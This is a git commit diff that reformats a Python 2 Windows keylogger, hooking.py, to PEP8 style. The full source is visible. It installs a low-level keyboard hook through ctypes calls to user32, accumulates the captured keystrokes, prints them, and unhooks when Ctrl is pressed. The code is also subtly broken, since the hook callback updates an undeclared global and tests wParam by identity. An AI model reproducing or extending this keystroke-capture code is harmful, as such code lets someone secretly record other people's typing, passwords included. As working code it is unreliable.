19d30d12386a786100a43a43106f99c6def3a633
John Ombagi <ombagi@outlook.com>
2017-08-25 12:53:14 +0300

    Refactor to PEP8 Guidelines

--- hooking.py
+++ hooking.py
@@ -13,57 +13,60 @@ from ctypes.wintypes import DWORD
 user32 = windll.user32
 kernel32 = windll.kernel32
 
-WH_KEYBOARD_LL=13
-WM_KEYDOWN=0x0100
+WH_KEYBOARD_LL = 13
+WM_KEYDOWN = 0x0100
 
 CTRL_CODE = 162
 
 
 class KeyLogger:
     keystrokesx = ''
+
     def __init__(self):
         self.lUser32 = user32
         self.hooked = None
-        
+
     def installHookProc(self, pointer):
         self.hooked = self.lUser32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer,
-        kernel32.GetModuleHandleW(None),0)
+                                                     kernel32.GetModuleHandleW(None), 0)
         if not self.hooked:
             return False
         return True
-        
+
     def uninstallHookProc(self):
         if self.hooked is None:
             return
         self.lUser32.UnhookWindowsHookEx(self.hooked)
         self.hooked = None
-        
+
+
 def getFPTR(fn):
     CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
     return CMPFUNC(fn)
-    
+
+
 def hookProc(nCode, wParam, lParam):
     if wParam is not WM_KEYDOWN:
-        return user32.CallNextHookEx(keyLogger.hooked, nCode,wParam, lParam)
+        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
     hookedKey = chr(lParam[0])
     keystrokesx += hookedKey
-    
+
     if(CTRL_CODE == int(lParam[0])):
         print keystrokesx
         print "Ctrl pressed, call uninstallHook()"
         keyLogger.uninstallHookProc()
         sys.exit(-1)
-        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam,lParam)
-        
+        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
+
+
 def startKeyLog():
     msg = MSG()
-    user32.GetMessageA(byref(msg),0,0,0)
+    user32.GetMessageA(byref(msg), 0, 0, 0)
 
-keyLogger = KeyLogger() #start of hook process
+keyLogger = KeyLogger()  # start of hook process
 pointer = getFPTR(hookProc)
 
 if keyLogger.installHookProc(pointer):
     print "installed keyLogger"
-    
-startKeyLog()
 
+startKeyLog()
